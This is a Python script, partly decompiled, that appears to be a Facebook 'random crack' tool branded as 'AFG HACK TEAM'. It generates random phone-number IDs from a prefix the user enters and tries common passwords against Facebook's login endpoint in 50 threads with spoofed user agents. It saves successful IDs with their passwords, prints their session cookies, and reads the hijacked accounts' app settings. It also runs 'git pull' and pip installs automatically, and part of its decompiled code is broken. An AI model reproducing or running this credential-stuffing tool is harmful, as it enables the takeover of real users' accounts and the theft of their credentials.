# Source Generated with Decompyle++
# File: test.pyc (Python 3.9)

import os
import sys
import time
import requests
import uuid
os.system('git pull')

class jalan:
    
    def __init__(self, z):
        pass


def main_menu():
    os.system('clear')
    print(logo)
    print('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
    print('\x1b[1;32m [2] \x1b[1;30mCONTACT ME ON FACEBOOK')
    print(' \x1b[1;32m[3] \x1b[1;34mSUBSCRIBE MY CHANNEL')
    print(' \x1b[1;32m[4] \x1b[1;35mJOIN FB GROUP')
    print(' \x1b[1;32m[00] \x1b[1;31mEXIT')
    shahzad = input('\n   \x1b[1;32m Choose option >>> ')
    if shahzad == '1':
        afg()
    if shahzad == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100082840689031')
        main_menu()
    if shahzad == '3':
        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
        main_menu()
    if shahzad == '4':
        os.system('xdg-open https://facebook.com/groups/207678473842318/')
        main_menu()
    if shahzad == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m[•] THANKS FOR USE \x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m ◇ Your Expired Apps ◇    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100000400628720', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =("""\33[1;34m   

     ###    ########  ######      ##     ##    ###     ######  ##    ## 
    ## ##   ##       ##    ##     ##     ##   ## ##   ##    ## ##   ##  
   ##   ##  ##       ##           ##     ##  ##   ##  ##       ##  ##   
  ##     ## ######   ##   ####    ######### ##     ## ##       #####    
  ######### ##       ##    ##     ##     ## ######### ##       ##  ##   
  ##     ## ##       ##    ##     ##     ## ##     ## ##    ## ##   ##  
  ##     ## ##        ######      ##     ## ##     ##  ######  ##    ## 

==========================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSYAED QASIM\33[0;m\033[1;32m && \033[1;33mSHAHZAD-KING\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m SAYED QASIM NASIMI && SHAHZAD RAHIMY 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mSHAHZAD-KING && SAYED QASIM NASIMI 
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTRAIL
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mAFG HACK TEAM && SKING-TECH
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.1
==========================================""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33m LOADING ASSET FILES... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31m NO INTERNET CONNECTION... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def afg():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    print(' EXAMPLE: 9378 9379 9377 9370 9374')
    print('\033[1;32m============================================')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    with ThreadPool(max_workers=50) as sking:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            uid = code+love
            pwx = [love,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','50006000','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','700800']
            sking.submit(skingrdm,uid,pwx,tl)
    print('\033[1;32m============================================')
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    print(' IDS SAVED IN OK.txt & CP.txt ')
    print('\033[1;32m============================================')
 
def skingrdm(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'x.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '3',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5764.208", "Google Chrome";v="114.0.5764.208"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"M2102J20SG"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            "user-agent": pro}
            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[AFG-SKING-OK]  ' +cid+ ' | ' +ps+'  \n \033[1;33m COOKIE = \033[1;32m'+coki+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AFG-SKING-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;30m[AFG-SKING-CP🤕]  ' +cid+ ' | ' +ps+'  \33[0;97m')
                open('/sdcard/AFG-SKING-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[AFG-SKING] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
main_menu()
 